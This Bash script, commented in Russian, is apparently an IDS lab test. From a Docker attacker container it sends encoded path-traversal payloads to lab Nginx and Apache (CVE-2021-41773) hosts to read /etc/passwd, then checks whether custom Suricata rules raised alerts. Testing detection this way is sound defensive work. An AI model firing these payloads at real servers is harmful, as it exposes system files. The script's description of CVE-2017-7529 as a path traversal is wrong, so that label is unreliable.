#!/bin/bash
set -e

# Функция для обработки ошибок
handle_error() {
    echo "Ошибка на строке $1"
    exit 1
}
trap 'handle_error $LINENO' ERR

echo "=== Тест 6: Эксплуатация CVE-2017-7529 (Nginx) и CVE-2021-41773 (Apache) ==="
echo ""

echo "=== Шаг 0: Перезагрузка Suricata для применения новых правил ==="
echo "Перезагрузка Suricata..."
sudo systemctl reload suricata || sudo systemctl restart suricata
sleep 3
echo "Проверка статуса Suricata..."
sudo systemctl status suricata --no-pager -l | head -5 || echo "Suricata запущена"
echo ""

echo "=== Шаг 1: Эксплуатация CVE-2017-7529 (Nginx Range Request Information Disclosure) ==="
echo "Цель: 172.20.0.106:80"
echo ""

# CVE-2017-7529: Эксплуатация через Range запросы
# Уязвимость позволяет читать файлы вне корневой директории
echo "[*] Попытка чтения /etc/passwd через Range запрос..."
NGINX_RESULT=$(docker exec attacker bash -c "curl -s -H 'Range: bytes=0-1000' 'http://172.20.0.106:80/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' 2>&1" || echo "Ошибка запроса")

if echo "$NGINX_RESULT" | grep -q "root:"; then
    echo "[+] УСПЕХ: CVE-2017-7529 эксплуатирована успешно!"
    echo "[+] Содержимое /etc/passwd (первые строки):"
    echo "$NGINX_RESULT" | head -5
else
    echo "[-] Не удалось прочитать /etc/passwd"
    echo "Результат: $NGINX_RESULT"
fi

echo ""
echo "[*] Попытка чтения /etc/hostname через Range запрос..."
NGINX_HOSTNAME=$(docker exec attacker bash -c "curl -s -H 'Range: bytes=0-100' 'http://172.20.0.106:80/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhostname' 2>&1" || echo "Ошибка запроса")

if [ -n "$NGINX_HOSTNAME" ] && [ "$NGINX_HOSTNAME" != "Ошибка запроса" ]; then
    echo "[+] УСПЕХ: Прочитан hostname: $NGINX_HOSTNAME"
else
    echo "[-] Не удалось прочитать hostname"
fi

echo ""
echo "=== Шаг 2: Эксплуатация CVE-2021-41773 (Apache Path Traversal) ==="
echo "Цель: 172.20.0.107:80"
echo ""

# CVE-2021-41773: Эксплуатация через path traversal
# Уязвимость позволяет читать файлы вне корневой директории
echo "[*] Попытка чтения /etc/passwd через path traversal..."
APACHE_RESULT=$(docker exec attacker bash -c "curl -s 'http://172.20.0.107:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>&1" || echo "Ошибка запроса")

if echo "$APACHE_RESULT" | grep -q "root:"; then
    echo "[+] УСПЕХ: CVE-2021-41773 эксплуатирована успешно!"
    echo "[+] Содержимое /etc/passwd (первые строки):"
    echo "$APACHE_RESULT" | head -5
else
    echo "[-] Попытка альтернативного пути..."
    # Альтернативный путь эксплойта
    APACHE_RESULT=$(docker exec attacker bash -c "curl -s 'http://172.20.0.107:80/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>&1" || echo "Ошибка запроса")
    if echo "$APACHE_RESULT" | grep -q "root:"; then
        echo "[+] УСПЕХ: CVE-2021-41773 эксплуатирована успешно (альтернативный путь)!"
        echo "[+] Содержимое /etc/passwd (первые строки):"
        echo "$APACHE_RESULT" | head -5
    else
        echo "[-] Не удалось прочитать /etc/passwd"
        echo "Результат: $APACHE_RESULT"
    fi
fi

echo ""
echo "[*] Попытка чтения /etc/hostname через path traversal..."
APACHE_HOSTNAME=$(docker exec attacker bash -c "curl -s 'http://172.20.0.107:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/hostname' 2>&1" || echo "Ошибка запроса")

if [ -n "$APACHE_HOSTNAME" ] && [ "$APACHE_HOSTNAME" != "Ошибка запроса" ] && ! echo "$APACHE_HOSTNAME" | grep -q "404\|403\|Forbidden"; then
    echo "[+] УСПЕХ: Прочитан hostname: $APACHE_HOSTNAME"
else
    echo "[-] Не удалось прочитать hostname"
fi

echo ""
echo "=== Шаг 3: Поиск алертов Suricata по правилам Nginx и Apache ==="
echo "Ожидание обработки событий Suricata..."
sleep 5

# Массив SID правил Nginx и Apache
WEB_SIDS=(3000601 3000602 3000603 3000604)
# Массив имен правил
WEB_RULE_NAMES=(
    "Nginx CVE-2017-7529 Range Request Exploitation"
    "Nginx Path Traversal Attempt"
    "Apache CVE-2021-41773 Path Traversal"
    "Apache CGI Path Traversal"
)

# Проверка наличия eve.json
if sudo test -f /var/log/suricata/eve.json; then
    echo "Поиск алертов Suricata в /var/log/suricata/eve.json..."
    echo ""
    
    # Вывод всех алертов (последние записи)
    echo "Последние алерты Suricata (Nginx/Apache правила):"
    sudo tail -n 200 /var/log/suricata/eve.json 2>/dev/null | jq -r 'select(.event_type=="alert" and (.alert.signature_id >= 3000601 and .alert.signature_id <= 3000604)) | "\(.timestamp) [SID:\(.alert.signature_id)] \(.alert.signature) | \(.src_ip):\(.src_port) -> \(.dest_ip):\(.dest_port)"' 2>/dev/null | tail -20 || echo "Не удалось прочитать алерты"
    
    echo ""
    echo "Поиск алертов по правилам Nginx/Apache (SID 3000601-3000604)..."
    echo ""
    
    # Поиск алертов по каждому правилу
    found_alerts=0
    for i in "${!WEB_SIDS[@]}"; do
        sid=${WEB_SIDS[$i]}
        rule_name=${WEB_RULE_NAMES[$i]}
        
        # Поиск алертов с данным SID (собираем все в массив, затем считаем)
        alert_count=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and .alert.signature_id==${sid})] | length" 2>/dev/null || echo "0")
        
        # Убираем лишние символы и проверяем, что это число
        alert_count=$(echo "$alert_count" | tr -d '\n\r ' | head -1)
        
        if [ -n "$alert_count" ] && [ "$alert_count" != "null" ] && [ "$alert_count" != "0" ] && [ "$alert_count" -gt 0 ] 2>/dev/null; then
            found_alerts=$((found_alerts + 1))
            echo "[✓] Найдено алертов для правила SID ${sid}: ${alert_count}"
            echo "    Правило: ${rule_name}"
            
            # Вывод деталей последнего алерта
            last_alert=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and .alert.signature_id==${sid})] | .[-1]" 2>/dev/null)
            if [ -n "$last_alert" ] && [ "$last_alert" != "null" ] && [ "$last_alert" != "" ]; then
                timestamp=$(echo "$last_alert" | jq -r '.timestamp // "N/A"' 2>/dev/null || echo "N/A")
                src_ip=$(echo "$last_alert" | jq -r '.src_ip // "N/A"' 2>/dev/null || echo "N/A")
                dest_ip=$(echo "$last_alert" | jq -r '.dest_ip // "N/A"' 2>/dev/null || echo "N/A")
                if [ "$timestamp" != "N/A" ] || [ "$src_ip" != "N/A" ]; then
                    echo "    Последний алерт: ${timestamp}"
                    echo "    Источник: ${src_ip} -> ${dest_ip}"
                fi
            fi
            echo ""
        fi
    done
    
    if [ $found_alerts -eq 0 ]; then
        echo "[!] Алерты по правилам Nginx/Apache не найдены"
        echo "    Проверьте, что Suricata обрабатывает трафик и правила активны"
    else
        echo "Всего найдено правил с алертами: ${found_alerts} из ${#WEB_SIDS[@]}"
    fi
    
    # Общая статистика по веб-алертам
    echo ""
    echo "Общая статистика по Nginx/Apache алертам:"
    total_web_alerts=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and (.alert.signature_id >= 3000601 and .alert.signature_id <= 3000604))] | length" 2>/dev/null || echo "0")
    total_web_alerts=$(echo "$total_web_alerts" | tr -d '\n\r ' | head -1)
    echo "Всего алертов Nginx/Apache: ${total_web_alerts}"
    
else
    echo "[!] Файл /var/log/suricata/eve.json не найден или недоступен"
    echo "    Проверьте статус Suricata: sudo systemctl status suricata"
fi

echo ""
echo "=== Шаг 4: Итоговый отчет ==="
echo "=========================================="
echo "📊 ИТОГОВЫЙ ОТЧЕТ ПО ТЕСТУ 6"
echo "=========================================="
echo ""
echo "✅ Эксплуатированные уязвимости:"
echo "   1. CVE-2017-7529 (Nginx Range Request Information Disclosure)"
echo "   2. CVE-2021-41773 (Apache Path Traversal)"
echo ""
echo "🎯 Целевые сервисы:"
echo "   - Nginx: 172.20.0.106:80"
echo "   - Apache: 172.20.0.107:80"
echo ""
if [ -n "$total_web_alerts" ] && [ "$total_web_alerts" != "0" ] && [ "$total_web_alerts" != "null" ]; then
    echo "🔔 Обнаружено алертов Suricata: ${total_web_alerts}"
    echo "   Правила защиты активированы и работают!"
else
    echo "⚠️  Алерты Suricata не обнаружены"
    echo "   Проверьте конфигурацию правил и статус Suricata"
fi
echo ""
echo "=========================================="
echo "=== Тест завершен ==="
